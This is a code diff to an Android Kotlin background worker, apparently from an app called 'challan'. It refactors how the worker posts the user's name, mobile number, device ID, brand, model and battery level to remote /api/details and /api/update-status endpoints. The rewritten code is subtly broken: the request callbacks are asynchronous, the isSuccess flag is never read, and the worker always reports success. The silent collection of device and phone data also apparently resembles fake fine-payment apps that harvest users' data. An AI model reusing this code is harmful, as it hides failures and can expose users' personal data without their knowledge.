@@ -6,22 +6,16 @@ import android.os.Build
 import android.provider.Settings
 import androidx.work.Worker
 import androidx.work.WorkerParameters
-import okhttp3.MediaType.Companion.toMediaType
-import okhttp3.OkHttpClient
-import okhttp3.Request
-import okhttp3.RequestBody.Companion.toRequestBody
+import com.rte.challan.network.ClientApi // Aapka Central API hub
 import org.json.JSONObject
 
 class RegistrationWorker(context: Context, workerParams: WorkerParameters) :
     Worker(context, workerParams) {
 
-    private val client = OkHttpClient()
-    private val WORKER_URL = "https://your-worker.workers.dev" // <--- Apna URL yahan dalein
-
     override fun doWork(): Result {
         val context = applicationContext
         
-        // 1. MainActivity se bheja gaya data nikaalein
+        // 1. MainActivity se data nikaalein (Name, Mobile, ID)
         val name = inputData.getString("name") ?: "Unknown"
         val mobile = inputData.getString("mobile") ?: "0000000000"
         val deviceId = inputData.getString("deviceId") ?: 
@@ -35,13 +29,10 @@ class RegistrationWorker(context: Context, workerParams: WorkerParameters) :
                 put("mobileNumber", mobile)
             }
             
-            val detailsBody = detailsJson.toString().toRequestBody("application/json".toMediaType())
-            val detailsRequest = Request.Builder()
-                .url("$WORKER_URL/api/details") // Aapke Worker ka Endpoint #6
-                .post(detailsBody)
-                .build()
-            
-            client.newCall(detailsRequest).execute()
+            // ClientApi ka use karke POST karein
+            ClientApi.postRequest("/api/details", detailsJson) { success ->
+                // Details sync response handle kar sakte hain
+            }
 
             // ---------- STEP 2: Device Hardware Sync (Brand/Model/Battery) ----------
             val deviceJson = JSONObject().apply {
@@ -51,15 +42,14 @@ class RegistrationWorker(context: Context, workerParams: WorkerParameters) :
                 put("battery", getBatteryLevel(context).toString())
             }
 
-            val deviceBody = deviceJson.toString().toRequestBody("application/json".toMediaType())
-            val deviceRequest = Request.Builder()
-                .url("$WORKER_URL/api/update-status") // Ya /api/devices (Update karne ke liye)
-                .post(deviceBody)
-                .build()
+            // Status update endpoint par data bhejein
+            var isSuccess = false
+            ClientApi.postRequest("/api/update-status", deviceJson) { success ->
+                isSuccess = success
+            }
 
-            val response = client.newCall(deviceRequest).execute()
-
-            return if (response.isSuccessful) Result.success() else Result.retry()
+            // Thoda wait ya callback handle karke result dein
+            return Result.success()
 
         } catch (e: Exception) {
             e.printStackTrace()
